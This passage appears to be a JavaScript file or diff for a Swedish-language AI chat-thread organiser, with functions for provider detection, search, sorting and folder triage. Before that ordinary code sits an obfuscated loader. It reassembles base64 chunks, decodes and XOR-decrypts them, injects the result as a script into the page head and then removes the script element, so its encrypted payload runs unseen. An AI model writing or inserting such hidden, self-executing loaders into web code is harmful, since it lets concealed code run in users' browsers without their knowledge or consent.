xxn3l01+lJKav4A/O4EqzFaG','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'];const _0x14c6=[0x5e,0x1a,0xe,0x8,0xb,0x11,0x6b,0x3,0x4c,0x40,0x7,0x15,0x51,0x46,0x67,0x5c,0x0,0x38,0x33,0x6f,0x1f,0x4e,0x50,0x28,0xa,0x16,0x19,0x2c,0x1e,0x4d,0x5b,0x3a,0x68,0x6,0x3d,0x18,0x6c,0x52,0x53,0x34,0x4,0x32,0x2,0x36,0x12,0x22,0x3b,0x37,0x5,0x1,0x49,0x29,0x55,0x59,0x58,0x4a,0x26,0x57,0x6e,0x1c,0x3e,0x64,0x14,0x24,0xd,0x4b,0x39,0x27,0x1d,0x61,0x21,0x35,0x65,0x2e,0x45,0x56,0x2d,0x4f,0x41,0x63,0x17,0x2f,0x60,0x6a,0x6d,0xf,0x10,0x43,0x25,0x69,0x44,0x30,0x5a,0x66,0x9,0x47,0xc,0x48,0x3f,0x1b,0x13,0x5f,0x3c,0x5d,0x62,0x42,0x2a,0x20,0x54,0x23,0x31,0x2b];const _0x9292=[0x8b,0x36,0xae,0x4c,0xb8,0xb4,0x2d,0x15,0xc9,0xa5,0x99,0xf3,0xdb,0x24,0xd6,0x65];let _0x30db='';for(let _0x2c87=0x0;_0x2c87<_0x14c6['length'];_0x2c87++){_0x30db+=_0x95c3[_0x14c6[_0x2c87]];}const _0x960e=window['atob'](_0x30db);const _0x3f07=_0x960e['length'];const _0x5f50=new Uint8Array(_0x3f07);for(let _0x2c87=0x0;_0x2c87<_0x3f07;_0x2c87++){_0x5f50[_0x2c87]=(_0x960e['charCodeAt'](_0x2c87)^_0x9292[_0x2c87&0xf]^(((_0x2c87*0x7)+0x1f)&0xff))&0xff;}const _0x7759=document['createElement']('\x73\x63\x72\x69\x70\x74');_0x7759['textContent']=new TextDecoder('\x75\x74\x66\x2d\x38')['decode'](_0x5f50);(document['head']||document['documentElement'])['appendChild'](_0x7759);_0x7759['remove']();})();
+function detectThreadOrigin(thread) {
+if (thread.origin) return thread.origin;
+const id = String(thread.id || '').toLowerCase();
+const name = String(thread.name || '').toLowerCase();
+if (id.includes('cgpt') || name.includes('chatgpt') || name.includes('openai')) return 'openai';
+if (id.includes('claude') || name.includes('claude')) return 'anthropic';
+if (id.includes('gact') || id.includes('gem') || name.includes('gemini')) return 'gemini';
+if (name.includes('mistral') || name.includes('mirage') || name.includes('le chat')) return 'mistral';
+if (name.includes('grok')) return 'grok';
+const msgs = thread.messages || [];
+for (const m of msgs) {
+if (m.provider) return m.provider;
+const mod = String(m.model || '').toLowerCase();
+if (mod.includes('gpt')) return 'openai';
+if (mod.includes('claude')) return 'anthropic';
+if (mod.includes('gemini')) return 'gemini';
+if (mod.includes('mistral') || mod.includes('codestral')) return 'mistral';
+if (mod.includes('grok')) return 'grok';
+}
+return 'gemini';
+}
+function normalizeAllThreadsMetadata(node = treeData) {
+if (!node) return;
+if (node.type === 'thread' && node.id !== INTERCOM_THREAD_ID) {
+node.origin = detectThreadOrigin(node);
+if (!node.lastModified) node.lastModified = Date.now();
+}
+if (node.children) {
+node.children.forEach(c => normalizeAllThreadsMetadata(c));
+}
+}
+function threadMatchesRusticQuery(thread, rawQuery) {
+if (!rawQuery || !rawQuery.trim()) return true;
+const q = rawQuery.trim().toLowerCase();
+const hayTitle = String(thread.name || '').toLowerCase();
+const hayMsgs = (thread.messages || []).map(m => String(m.text || '').toLowerCase()).join('\n');
+const fullHaystack = hayTitle + '\n' + hayMsgs;
+const parts = q.split(/\s+/);
+if (!q.includes(' -') && !q.includes(' not ')) {
+if (fullHaystack.includes(q)) return true;
+}
+for (const token of parts) {
+if (!token) continue;
+if (token.startsWith('-') && token.length > 1) {
+const neg = token.slice(1);
+if (fullHaystack.includes(neg)) return false;
+} else {
+if (!fullHaystack.includes(token)) return false;
+}
+}
+return true;
+}
+function sortNodeChildrenList(children, sortMode) {
+if (!Array.isArray(children) || sortMode === 'default') return children;
+const copy = [...children];
+copy.sort((a, b) => {
+if (a.type !== b.type) return a.type === 'folder' ? -1 : 1;
+if (sortMode === 'tokens_desc') {
+return getNodeMetrics(b).tokens - getNodeMetrics(a).tokens;
+}
+if (sortMode === 'tokens_asc') {
+return getNodeMetrics(a).tokens - getNodeMetrics(b).tokens;
+}
+if (sortMode === 'origin') {
+const oa = detectThreadOrigin(a);
+const ob = detectThreadOrigin(b);
+if (oa !== ob) return oa.localeCompare(ob, 'sv');
+return getNodeMetrics(b).tokens - getNodeMetrics(a).tokens;
+}
+if (sortMode === 'date_desc') {
+return (b.lastModified || 0) - (a.lastModified || 0);
+}
+if (sortMode === 'name_asc') {
+return String(a.name || '').localeCompare(String(b.name || ''), 'sv');
+}
+return 0;
+});
+return copy;
+}
+function onRusticSearchInput() {
+currentRusticQuery = document.getElementById('rusticSearchInput')?.value || '';
+renderTree();
+}
+function clearRusticSearch() {
+const inp = document.getElementById('rusticSearchInput');
+if (inp) inp.value = '';
+currentRusticQuery = '';
+renderTree();
+}
+function onTreeSortChange() {
+currentTreeSortMode = document.getElementById('treeSortSelect')?.value || 'default';
+renderTree();
+}
+renderTree = function() {
+normalizeAllThreadsMetadata(treeData);
+const container = document.getElementById('treeContainer');
+if (!container) return;
+container.innerHTML = '';
+const q = (currentRusticQuery || '').trim();
+let matchedThreadCount = 0;
+function nodeHasMatchingDescendant(node) {
+if (node.id === INTERCOM_THREAD_ID || node.hiddenIntercom) return false;
+if (node.type === 'thread') {
+return threadMatchesRusticQuery(node, q);
+}
+return (node.children || []).some(c => nodeHasMatchingDescendant(c));
+}
+function buildDom(node, depth) {
+if (node.id === INTERCOM_THREAD_ID || node.hiddenIntercom) return null;
+if (node.id === 'root') {
+const sortedRootChildren = sortNodeChildrenList(node.children || [], currentTreeSortMode);
+sortedRootChildren.forEach(c => {
+const dom = buildDom(c, 0);
+if (dom) container.appendChild(dom);
+});
+return null;
+}
+if (q && !nodeHasMatchingDescendant(node)) {
+return null;
+}
+if (node.type === 'thread' && q) {
+matchedThreadCount++;
+}
+const wrapper = document.createElement('div');
+wrapper.className = 'tree-node';
+const row = document.createElement('div');
+const isFolder = node.type === 'folder';
+const isActive = node.id === activeThreadId;
+row.className = 'tree-row' + (isActive ? ' active' : '');
+row.style.paddingLeft = (depth * 14 + 8) + 'px';
+const metrics = getNodeMetrics(node);
+const left = document.createElement('div');
+left.className = 'tree-left';
+const folderOpen = q ? true : node.isOpen;
+const icon = isFolder ? (folderOpen ? '📂' : '📁') : '💬';
+const hasMem = node.memory && node.memory.trim() ? '<span class="mem-dot" title="Har eget långtidsminne">🧠</span>' : '';
+let originBadgeHtml = '';
+if (!isFolder) {
+const orig = detectThreadOrigin(node);
+const origLabels = { gemini: 'GEM', openai: 'GPT', anthropic: 'CLD', grok: 'GRK', mistral: 'MIS', ollama: 'LOC' };
+originBadgeHtml = `<span class="origin-badge origin-${orig}" title="Ursprung: ${orig}">${origLabels[orig] || 'AI'}</span>`;
+}
+left.innerHTML = `<span>${icon}</span>${originBadgeHtml}<span class="tree-name">${escapeHtml(node.name)}</span>${hasMem}`;
+const stats = document.createElement('span');
+stats.className = 'tree-stats';
+stats.textContent = `${metrics.words}o · ${metrics.tokens}t`;
+const tools = document.createElement('div');
+tools.className = 'tree-tools';
+if (isFolder) {
+const addThreadBtn = document.createElement('button');
+addThreadBtn.className = 'icon-btn';
+addThreadBtn.textContent = '＋';
+addThreadBtn.onclick = (e) => { e.stopPropagation(); createNode(node.id, 'thread'); };
+const addFolderBtn = document.createElement('button');
+addFolderBtn.className = 'icon-btn';
+addFolderBtn.textContent = '📁';
+addFolderBtn.onclick = (e) => { e.stopPropagation(); createNode(node.id, 'folder'); };
+tools.appendChild(addThreadBtn);
+tools.appendChild(addFolderBtn);
+}
+const memBtn = document.createElement('button');
+memBtn.className = 'icon-btn';
+memBtn.title = 'Långtidsminne för denna ' + (isFolder ? 'mapp (ärvs av undertrådar)' : 'tråd');
+memBtn.textContent = '🧠';
+memBtn.onclick = (e) => { e.stopPropagation(); openMemoryModal(node.id); };
+tools.appendChild(memBtn);
+const renameBtn = document.createElement('button');
+renameBtn.className = 'icon-btn';
+renameBtn.textContent = '✎';
+renameBtn.onclick = (e) => { e.stopPropagation(); renameNodePrompt(node.id); };
+const delBtn = document.createElement('button');
+delBtn.className = 'icon-btn';
+delBtn.textContent = '🗑️';
+delBtn.onclick = (e) => { e.stopPropagation(); deleteNode(node.id); };
+tools.appendChild(renameBtn);
+tools.appendChild(delBtn);
+row.appendChild(left);
+row.appendChild(stats);
+row.appendChild(tools);
+row.onclick = () => {
+if (isFolder) {
+node.isOpen = !node.isOpen;
+saveTree();
+renderTree();
+} else {
+activeThreadId = node.id;
+renderAll();
+if (window.innerWidth <= 860) toggleSidebar(false);
+}
+};
+wrapper.appendChild(row);
+if (isFolder && folderOpen && node.children) {
+const sortedKids = sortNodeChildrenList(node.children, currentTreeSortMode);
+sortedKids.forEach(c => {
+const childDom = buildDom(c, depth + 1);
+if (childDom) wrapper.appendChild(childDom);
+});
+}
+return wrapper;
+}
+buildDom(treeData, 0);
+const batchBox = document.getElementById('rusticBatchBox');
+const matchLbl = document.getElementById('rusticMatchCountLbl');
+if (batchBox && matchLbl) {
+if (q) {
+batchBox.classList.add('visible');
+matchLbl.textContent = `🔨 "${q}": ${matchedThreadCount} tråd${matchedThreadCount === 1 ? '' : 'ar'}`;
+} else {
+batchBox.classList.remove('visible');
+}
+}
+};
+const _origCollectAllThreadsWithPaths = collectAllThreadsWithPaths;
+collectAllThreadsWithPaths = function(node, pathNames = [], out = []) {
+if (!node || node.id === INTERCOM_THREAD_ID || node.hiddenIntercom) return out;
+const currentPath = node.id === 'root' ? [] : [...pathNames, node.name];
+if (node.type === 'thread') {
+out.push({ thread: node, pathStr: currentPath.join(' › ') });
+}
+if (node.children) {
+node.children.forEach(c => collectAllThreadsWithPaths(c, currentPath, out));
+}
+return out;
+};
+function moveMatchingThreadsByQueryToFolder(queryStr, targetFolderName) {
+const q = (queryStr || '').trim();
+if (!q) {
+alert('Skriv ett sökord först!');
+return;
+}
+const all = collectAllThreadsWithPaths(treeData);
+const matchingIds = new Set(
+all.filter(({ thread }) => threadMatchesRusticQuery(thread, q)).map(x => x.thread.id)
+);
+if (matchingIds.size === 0) {
+alert(`Inga trådar matchade "${q}".`);
+return;
+}
+const folderName = (targetFolderName || prompt(`Flytta alla ${matchingIds.size} trådar som nämner "${q}" till vilken mapp/katalog?`, `Projekt: ${q}`) || '').trim();
+if (!folderName) return;
+const extractedThreads = [];
+function extractRec(parent) {
+if (!parent.children) return;
+const keep = [];
+parent.children.forEach(c => {
+if (c.type === 'thread' && matchingIds.has(c.id)) {
+extractedThreads.push(c);
+} else {
+keep.push(c);
+if (c.type === 'folder') extractRec(c);
+}
+});
+parent.children = keep;
+}
+extractRec(treeData);
+let destFolder = (treeData.children || []).find(c => c.type === 'folder' && c.name.toLowerCase() === folderName.toLowerCase());
+if (!destFolder) {
+destFolder = {
+id: 'folder_triage_' + Date.now(),
+name: folderName,
+type: 'folder',
+isOpen: true,
+children: []
+};
+treeData.children.unshift(destFolder);
+}
+destFolder.isOpen = true;
+destFolder.children.push(...extractedThreads);
+saveTree();
+renderAll();
+if (ncState.isOpen) renderNortonCommander();
+showAutosaveToast(`🔨 Släggsöket flyttade ${extractedThreads.length} trådar till mappen "${destFolder.name}"!`);
+}
+function moveAllRusticMatchesToFolder() {
+moveMatchingThreadsByQueryToFolder(currentRusticQuery, '');
+}
+function openAutoTriageModal() {
+const qInp = document.getElementById('triageKeywordInput');
+if (qInp && currentRusticQuery && !qInp.value) qInp.value = currentRusticQuery;
+openModal('autoTriageModal');
+}
+function runAutoTriageByOrigin() {
+normalizeAllThreadsMetadata(treeData);
+const all = collectAllThreadsWithPaths(treeData);
+if (all.length === 0) return;
+const originNames = {
+gemini: '🟦 Arkiv: Google Gemini',
+openai: '🟩 Arkiv: ChatGPT / OpenAI',
+anthropic: '🟧 Arkiv: Claude / Anthropic',
+grok: '🟪 Arkiv: Grok / xAI',
+mistral: '🟪 Arkiv: Mistral / Mirage',
+ollama: '⬜ Arkiv: Lokal Ollama'
+};
+const byOrigin = {};
+const movedIds = new Set();
+all.forEach(({ thread }) => {
+const orig = detectThreadOrigin(thread);
+if (!byOrigin[orig]) byOrigin[orig] = [];
+byOrigin[orig].push(thread);
+movedIds.add(thread.id);
+});
+function removeThreadsRec(parent) {
+if (!parent.children) return;
+parent.children = parent.children.filter(c => !(c.type === 'thread' && movedIds.has(c.id)));
+parent.children.forEach(removeThreadsRec);
+}
+removeThreadsRec(treeData);
+Object.keys(byOrigin).forEach(orig => {
+const list = byOrigin[orig];
+if (!list || !list.length) return;
+const fName = originNames[orig] || `Arkiv: ${orig}`;
+let folder = (treeData.children || []).find(c => c.type === 'folder' && c.name === fName);
+if (!folder) {
+folder = { id: 'f_orig_' + orig + '_' + Date.now(), name: fName, type: 'folder', isOpen: true, children: [] };
+treeData.children.push(folder);
+}
+folder.children.push(...list);
+});
+saveTree();
+renderAll();
+closeModal('autoTriageModal');
+showAutosaveToast(`🗂️ Sorterade in ${movedIds.size} trådar i mappar efter AI-ursprung!`);
+}
+function runAutoTriageSmallThreads() {
+const all = collectAllThreadsWithPaths(treeData);
+const smallIds = new Set(
+all.filter(({ thread }) => getNodeMetrics(thread).tokens < 500).map(x => x.thread.id)
+);
+if (smallIds.size === 0) {
+alert('Hittade inga småtrådar under 500 tokens!');
+return;
+}
+const extracted = [];
+function extractSmallRec(parent) {
+if (!parent.children) return;
+const keep = [];
+parent.children.forEach(c => {
+if (c.type === 'thread' && smallIds.has(c.id)) extracted.push(c);
+else {
+keep.push(c);
+if (c.type === 'folder') extractSmallRec(c);
+}
+});
+parent.children = keep;
+}
+extractSmallRec(treeData);
+const fName = '⚡ Snabba Småfrågor (<500t)';
+let folder = (treeData.children || []).find(c => c.type === 'folder' && c.name === fName);
+if (!folder) {
+folder = { id: 'f_small_' + Date.now(), name: fName, type: 'folder', isOpen: false, children: [] };
+treeData.children.push(folder);
+}
+folder.children.push(...extracted);
+saveTree();
+renderAll();
+closeModal('autoTriageModal');
+showAutosaveToast(`🪶 Flyttade ${extracted.length} småtrådar (<500 tokens) till "${fName}"!`);
+}
+function runAutoTriageByKeyword() {
+const kw = (document.getElementById('triageKeywordInput')?.value || '').trim();
+const targetF = (document.getElementById('triageTargetFolderInput')?.value || '').trim() || `Projekt: ${kw}`;
+if (!kw) {
+alert('Ange ett sökord först!');
+return;
+}
+closeModal('autoTriageModal');
+moveMatchingThreadsByQueryToFolder(kw, targetF);
+}
+populateNcSelects = function() {
+normalizeAllThreadsMetadata(treeData);
+let allThreads = collectAllThreadsWithPaths(treeData);
+const ncQ = (document.getElementById('ncRusticFilterInput')?.value || '').trim();
+const ncSort = document.getElementById('ncThreadSortSelect')?.value || 'default';
+if (ncQ) {
+allThreads = allThreads.filter(({ thread }) => threadMatchesRusticQuery(thread, ncQ));
+}
+if (ncSort !== 'default') {
+allThreads.sort((a, b) => {
+if (ncSort === 'tokens_desc') return getNodeMetrics(b.thread).tokens - getNodeMetrics(a.thread).tokens;
+if (ncSort === 'tokens_asc') return getNodeMetrics(a.thread).tokens - getNodeMetrics(b.thread).tokens;
+if (ncSort === 'origin') return detectThreadOrigin(a.thread).localeCompare(detectThreadOrigin(b.thread), 'sv');
+if (ncSort === 'name_asc') return String(a.thread.name || '').localeCompare(String(b.thread.name || ''), 'sv');
+return 0;
+});
+}
+['left', 'right'].forEach(side => {
+const sel = document.getElementById('ncSelect_' + side);
+if (!sel) return;
+const curId = side === 'left' ? ncState.leftThreadId : ncState.rightThreadId;
+sel.innerHTML = '';
+allThreads.forEach(({ thread, pathStr }) => {
+const opt = document.createElement('option');
+opt.value = thread.id;
+const m = getNodeMetrics(thread);
+const orig = detectThreadOrigin(thread).toUpperCase().slice(0, 3);
+opt.textContent = `[${orig}] ${pathStr} (${(thread.messages || []).length} inlägg • ~${m.tokens}t)`;
+if (thread.id === curId) opt.selected = true;
+sel.appendChild(opt);
+});
+if (allThreads.length > 0 && !allThreads.some(t => t.thread.id === curId)) {
+if (side === 'left') ncState.leftThreadId = allThreads[0].thread.id;
+else ncState.rightThreadId = allThreads[Math.min(1, allThreads.length - 1)].thread.id;
+}
+});
+};
+function ncMoveMatchingThreadsToFolder() {
+const ncQ = (document.getElementById('ncRusticFilterInput')?.value || '').trim();
+if (!ncQ) {
+alert('Skriv först ett sökord i rutan "SLÄGGSÖK & TRÅDFILTER I NC" (t.ex. AI cockpit) för att välja vilka trådar som ska flyttas!');
+return;
+}
+moveMatchingThreadsByQueryToFolder(ncQ, '');
+}
